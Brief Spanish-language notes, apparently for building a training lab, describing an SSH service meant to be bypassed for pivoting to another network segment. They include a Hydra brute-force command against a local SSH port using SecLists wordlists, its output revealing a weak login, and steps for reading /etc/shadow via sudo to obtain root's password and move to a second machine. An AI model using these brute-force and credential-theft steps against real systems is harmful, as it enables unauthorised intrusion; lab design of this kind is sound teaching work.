Montar SSH que solo haga prompt de algo, pero que se pueda bypasear, y saltar a otro segmento de red.

junquera@vangelis:~$ hydra -L PARA/resources/SecLists/Usernames/top-usernames-shortlist.txt -P PARA/resources/SecLists/Passwords/500-worst-passwords.txt ssh://localhost:2222
[2222][ssh] host: localhost   login: test   password: monkey


sudo da acceso a /etc/shadow

Con /etc/shadow saco passwd de root, y me conecto a segunda máquina

https://eu.bbcollab.com/guest/799ea4388a39407e9af2027c44b5262e

# Example: https://stackoverflow.com/questions/21383806/how-can-i-force-ssh-to-accept-a-new-host-fingerprint-from-the-command-line
